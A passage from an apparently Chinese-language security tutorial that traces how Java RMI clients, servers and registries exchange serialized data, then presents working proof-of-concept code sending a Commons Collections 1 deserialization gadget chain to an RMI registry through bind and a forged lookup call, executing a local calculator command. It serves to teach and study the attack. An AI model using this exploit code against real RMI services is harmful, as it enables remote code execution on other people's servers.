  * 序列化后的var2，var2为我们要绑定的远程对象
在invoke这里会把请求发出去，接着我们看看注册中心在收到这条请求后是如何进行处理的，前面说了会调用Skel#dispatch来处理请求，我们直接看这个就可以了。
注册中心首先会read两个Object，第一个即我们刚刚write进去的字符串对象，第二个就是远程对象了，接着调用var6.bind来绑定服务，var6即RegistryImpl对象，他是如何绑定服务的在上边写了。
至此，我们已经了解了当注册中心的方法被调用时，远程获取和本地获取的差异是什么。
## 客户端与服务端的通信
客户端与服务端的通信只发生在调用远程方法时。此时是客户端的远程代理对象与的Skel进行通信。
我们在客户端获取的是注册中心封装好的代理对象，所以默认会调用代理对象的invoke方法：
在这里会判断你调用的方法是所有对象都有的，还是只有远程对象才有的，如果是前者，则进入invokeObjectMethod中，后者则进入invokeRemoteMethod中。
跟入RemoteObjectInvocationHandle#invokeRemoteMethod中：
在这里会调用this.ref.invoke，并把proxy、method、args以及method的hash传过去，this.ref是在lookup时获取到的远程对象绑定的一些端口信息：
这里的端口是随机的，每次都会变，接着跟一下LiveRef#invoke：
同样的，在newConnection这里会发送一些约定好了的数据。
接着往下看：
在marshaValue这里，会将我们调用的方法要传递的参数序列化写到连接中，如果传递的参数是对象，就会写入序列化对象到这里：
接着会调用StreamRemoteCall#executeCall：
跟入：
在this.releaseOutputStream方法中，会读取服务端执行的结果：
在this.out.flush时，会把之前写进去的数据发出去，服务端会返回执行结果：
在调用完executeCall后，会进入下边这个方法，把数据取出来：
调用了unmarsharValue方法，把数据取出来，用的是jdk自带的readObject：
至此，客户端是如何和服务端通信的我们清楚了，那么服务端又是如何与客户端通信的呢？
当Client在与Server通信时，Server实际处理请求的位置在：UnicastServerRef#dispatch
在这里会调用unmarshaValue，对请求传来的参数进行处理：
在这里会判断参数的数据类型，如果是Object的话，则会反序列化，所以在这里我们如果能够找到Server注册的远程对象中，如果某个方法传递的参数类型是Object，在服务端这里会被反序列化，此时即可造成RCE（当然得有gadget）。
最终通过调用invoke，来调用远程对象的方法。
# Java-RMI-反序列化攻击方式汇总
上面已经把客户端、服务端、注册中心三者是如何交互的给简单分析了一下，可以发现其通讯过程是基于序列化的，那么有序列化，自然就会有反序列化，所以我们只需要根据反序列化的点去攻击就好了。
## 攻击注册中心
我们可以通过以下方法与注册中心进行交互：
  * list
  * bind
  * rebind
  * rebind
  * lookup
我们来看看注册中心对这几种方法的处理，如果存在readObject，则可以利用。
### list
当调用list时，不存在readObject，所以无法攻击注册中心。
### bind & rebind
当调用bind时，会用readObject读出参数名以及远程对象，此时则可以利用。
当调用rebind时，会用readObject读出参数名和远程对象，这里和bind是一样的，所以都可以利用。
Demo：
    import org.apache.commons.collections.Transformer;
    import org.apache.commons.collections.functors.ChainedTransformer;
    import org.apache.commons.collections.functors.ConstantTransformer;
    import org.apache.commons.collections.functors.InvokerTransformer;
    import java.lang.reflect.Constructor;
    import java.lang.reflect.InvocationHandler;
    import java.lang.reflect.Proxy;
    import java.rmi.Remote;
    import java.rmi.registry.LocateRegistry;
    import java.rmi.registry.Registry;
    import java.util.HashMap;
    import java.util.Map;
    public class Client {
        public static void main(String[] args) throws Exception {
            ChainedTransformer chain = new ChainedTransformer(new Transformer[] {
                    new ConstantTransformer(Runtime.class),
                    new InvokerTransformer("getMethod", new Class[] {
                            String.class, Class[].class }, new Object[] {
                            "getRuntime", new Class[0] }),
                    new InvokerTransformer("invoke", new Class[] {
                            Object.class, Object[].class }, new Object[] {
                            null, new Object[0] }),
                    new InvokerTransformer("exec",
                            new Class[] { String.class }, new Object[]{"open  /System/Applications/Calculator.app"})});
            HashMap innermap = new HashMap();
            Class clazz = Class.forName("org.apache.commons.collections.map.LazyMap");
            Constructor[] constructors = clazz.getDeclaredConstructors();
            Constructor constructor = constructors[0];
            constructor.setAccessible(true);
            Map map = (Map)constructor.newInstance(innermap,chain);
            Constructor handler_constructor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructor(Class.class,Map.class);
            handler_constructor.setAccessible(true);
            InvocationHandler map_handler = (InvocationHandler) handler_constructor.newInstance(Override.class,map); //创建第一个代理的handler
            Map proxy_map = (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),new Class[]{Map.class},map_handler); //创建proxy对象
            Constructor AnnotationInvocationHandler_Constructor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructor(Class.class,Map.class);
            AnnotationInvocationHandler_Constructor.setAccessible(true);
            InvocationHandler handler = (InvocationHandler)AnnotationInvocationHandler_Constructor.newInstance(Override.class,proxy_map);
            Registry registry = LocateRegistry.getRegistry("127.0.0.1",8888);
            Remote r = Remote.class.cast(Proxy.newProxyInstance(
                    Remote.class.getClassLoader(),
                    new Class[] { Remote.class }, handler));
            registry.bind("test",r);
        }
    }
这里我用的是cc1的链，所以服务端自然也需要存在cc1相关的漏洞组件才行。
重点关注：
    Remote r = Remote.class.cast(Proxy.newProxyInstance(
            Remote.class.getClassLoader(),
            new Class[] { Remote.class }, handler));
Remote.class.cast这里实际上是将一个代理对象转换为了Remote对象：
    Proxy.newProxyInstance(
                    Remote.class.getClassLoader(),
                    new Class[] { Remote.class }, handler)
上述代码中创建了一个代理对象，这个代理对象代理了Remote.class接口，handler为我们的handler对象。当调用这个代理对象的一切方法时，最终都会转到调用handler的invoke方法。
而handler是InvocationHandler对象，所以这里在反序列化时会调用InvocationHandler对象的invoke方法：
在invoke方法里，同样会触发memberValues的get方法，此时的memberValues是proxy_map，其也是一个代理类对象，所以会继续触发proxy_map的invoke方法，后边的就是cc1的前半段内容了。
### unbind & lookup
从上述代码中我们可以发现，unbind和lookup实际上都会调用readObject来读取传递过来的参数，所以同样是可以利用的。
不过这里有一个问题，当我们调用unbind或者lookup时，只允许我们传递字符串，所以没法传递我们的恶意对象。这个问题要解决有几种办法：
  * 伪造连接请求
  * rasp hook请求代码，修改发送数据
我用的是第一种，也是比较简单的一种，直接通过反射就能实现。
想要手动伪造请求，我们就需要去判断一下当执行lookup时，会经过怎样的流程。
在调用lookup之前，我们需要先获取客户端，通过getRegistry方法返回的是一个Registry_Stub对象。
Registry_Stub#lookup
    public Remote lookup(String var1) throws AccessException, NotBoundException, RemoteException {
            try {
                RemoteCall var2 = super.ref.newCall(this, operations, 2, 4905912898345647071L);
                try {
                    ObjectOutput var3 = var2.getOutputStream();
                    var3.writeObject(var1);
                } catch (IOException var18) {
                    throw new MarshalException("error marshalling arguments", var18);
                }
                super.ref.invoke(var2);
                Remote var23;
                try {
                    ObjectInput var6 = var2.getInputStream();
                    var23 = (Remote)var6.readObject();
                } catch (IOException var15) {
                    throw new UnmarshalException("error unmarshalling return", var15);
                } catch (ClassNotFoundException var16) {
                    throw new UnmarshalException("error unmarshalling return", var16);
                } finally {
                    super.ref.done(var2);
                }
                return var23;
            } catch (RuntimeException var19) {
                throw var19;
            } catch (RemoteException var20) {
                throw var20;
            } catch (NotBoundException var21) {
                throw var21;
            } catch (Exception var22) {
                throw new UnexpectedException("undeclared checked exception", var22);
            }
        }
我们只需要照抄一遍，再修改一下代码即可。
Demo：
    import org.apache.commons.collections.Transformer;
    import org.apache.commons.collections.functors.ChainedTransformer;
    import org.apache.commons.collections.functors.ConstantTransformer;
    import org.apache.commons.collections.functors.InvokerTransformer;
    import sun.rmi.server.UnicastRef;
    import java.io.ObjectOutput;
    import java.lang.reflect.Constructor;
    import java.lang.reflect.Field;
    import java.lang.reflect.InvocationHandler;
    import java.lang.reflect.Proxy;
    import java.rmi.Remote;
    import java.rmi.registry.LocateRegistry;
    import java.rmi.registry.Registry;
    import java.rmi.server.Operation;
    import java.rmi.server.RemoteCall;
    import java.rmi.server.RemoteObject;
    import java.util.HashMap;
    import java.util.Map;
    public class Client {
        public static void main(String[] args) throws Exception {
            ChainedTransformer chain = new ChainedTransformer(new Transformer[] {
                    new ConstantTransformer(Runtime.class),
                    new InvokerTransformer("getMethod", new Class[] {
                            String.class, Class[].class }, new Object[] {
                            "getRuntime", new Class[0] }),
                    new InvokerTransformer("invoke", new Class[] {
                            Object.class, Object[].class }, new Object[] {
                            null, new Object[0] }),
                    new InvokerTransformer("exec",
                            new Class[] { String.class }, new Object[]{"open  /System/Applications/Calculator.app"})});
            HashMap innermap = new HashMap();
            Class clazz = Class.forName("org.apache.commons.collections.map.LazyMap");
            Constructor[] constructors = clazz.getDeclaredConstructors();
            Constructor constructor = constructors[0];
            constructor.setAccessible(true);
            Map map = (Map)constructor.newInstance(innermap,chain);
            Constructor handler_constructor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructor(Class.class,Map.class);
            handler_constructor.setAccessible(true);
            InvocationHandler map_handler = (InvocationHandler) handler_constructor.newInstance(Override.class,map); //创建第一个代理的handler
            Map proxy_map = (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),new Class[]{Map.class},map_handler); //创建proxy对象
            Constructor AnnotationInvocationHandler_Constructor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructor(Class.class,Map.class);
            AnnotationInvocationHandler_Constructor.setAccessible(true);
            InvocationHandler handler = (InvocationHandler)AnnotationInvocationHandler_Constructor.newInstance(Override.class,proxy_map);
    //
            Registry registry = LocateRegistry.getRegistry("127.0.0.1",8888);
            Remote r = Remote.class.cast(Proxy.newProxyInstance(
                    Remote.class.getClassLoader(),
                    new Class[] { Remote.class }, handler));
            // 获取ref
            Field[] fields_0 = registry.getClass().getSuperclass().getSuperclass().getDeclaredFields();
            fields_0[0].setAccessible(true);
            UnicastRef ref = (UnicastRef) fields_0[0].get(registry);
            //获取operations
            Field[] fields_1 = registry.getClass().getDeclaredFields();
            fields_1[0].setAccessible(true);
            Operation[] operations = (Operation[]) fields_1[0].get(registry);
            // 伪造lookup的代码，去伪造传输信息
            RemoteCall var2 = ref.newCall((RemoteObject) registry, operations, 2, 4905912898345647071L);